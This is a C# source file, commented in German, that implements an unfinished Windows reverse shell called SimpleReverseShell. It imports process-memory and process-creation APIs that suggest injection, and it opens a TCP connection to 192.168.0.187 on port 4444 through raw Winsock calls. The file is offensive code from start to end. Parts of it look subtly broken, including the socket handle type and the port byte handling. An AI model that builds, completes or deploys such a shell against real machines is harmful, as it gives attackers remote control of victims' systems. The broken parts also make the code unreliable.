using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static SimpleReverseShell.SimpleSysCallShell;

namespace SimpleReverseShell
{
  // Vorlage für diese Implementierung: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
  internal class SimpleSysCallShell
  {
    #region MemoryManagement
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public Int32 dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }
    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
    }
    public const int PROCESSBASICINFORMATION = 0;
    #endregion

    #region Sockets
    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern SOCKET WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name="socket">Das Socket.</param>
    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
    /// <param name="namelen">Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int connect(SOCKET socket, ref SockAddr name, int namelen);

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOL_INFOA
    {
      int dwServiceFlags1;
      int dwServiceFlags2;
      int dwServiceFlags3;
      int dwServiceFlags4;
      int dwProviderFlags;
      Guid ProviderId;
      int dwCatalogEntryId;
      WSAPROTOCOLCHAIN ProtocolChain;
      int iVersion;
      int iAddressFamily;
      int iMaxSockAddr;
      int iMinSockAddr;
      int iSocketType;
      int iProtocol;
      int iProtocolMaxOffset;
      int iNetworkByteOrder;
      int iSecurityScheme;
      int dwMessageSize;
      int dwProviderReserved;
      char szProtocol;
    }

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocolchain
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOLCHAIN
    {
      int ChainLen;
      int ChainEntries;
    }

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-socket
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SOCKET
    {
      int af;
      int type;
      int protocol;
    }

    /// <summary>
    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr_In
    {
      internal short s_family;
      internal ushort s_port;
      internal In_Addr s_addr;
      internal char sin_zero;
    }

    /// <summary>
    /// Repräsentiert eine IPv4 Adresse.
    /// Dokumentation hierzu: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct In_Addr
    {
      internal byte s_b1;
      internal byte s_b2;
      internal byte s_b3;
      internal byte s_b4;
    }

    /// <summary>
    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr
    {
      internal ushort sa_family;
      internal byte[] sa_data;
    }

    #endregion

    public void Start()
    {
      var protcolInfo = new WSAPROTOCOL_INFOA();
      var ipv4 = new SockAddr();

      var addrIn = new In_Addr();
      addrIn.s_b1 = 192;
      addrIn.s_b2 = 168;
      addrIn.s_b3 = 0;
      addrIn.s_b4 = 187;

      var sockAddrIn = new SockAddr_In();
      sockAddrIn.s_family = 2;
      sockAddrIn.s_port = 4444;
      sockAddrIn.s_addr = addrIn;

      var sockaddr = new SockAddr();
      sockaddr.sa_family = (ushort)sockAddrIn.s_family;


      sockaddr.sa_data = new byte[14];
      // Copy port number (assuming it's in network byte order)
      sockaddr.sa_data[0] = (byte)(sockAddrIn.s_port >> 8);  // High byte
      sockaddr.sa_data[1] = (byte)(sockAddrIn.s_port & 0xFF); // Low byte

      // Copy IPv4 address
      sockaddr.sa_data[2] = sockAddrIn.s_addr.s_b1;
      sockaddr.sa_data[3] = sockAddrIn.s_addr.s_b2;
      sockaddr.sa_data[4] = sockAddrIn.s_addr.s_b3;
      sockaddr.sa_data[5] = sockAddrIn.s_addr.s_b4;

      // Fill the rest of the sa_data array with zeros
      for (int i = 6; i < sockaddr.sa_data.Length; i++)
      {
        sockaddr.sa_data[i] = 0;
      }


      var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);
      connect(socket, ref sockaddr, Marshal.SizeOf(sockaddr));
      // connect call.
    }
  }
}
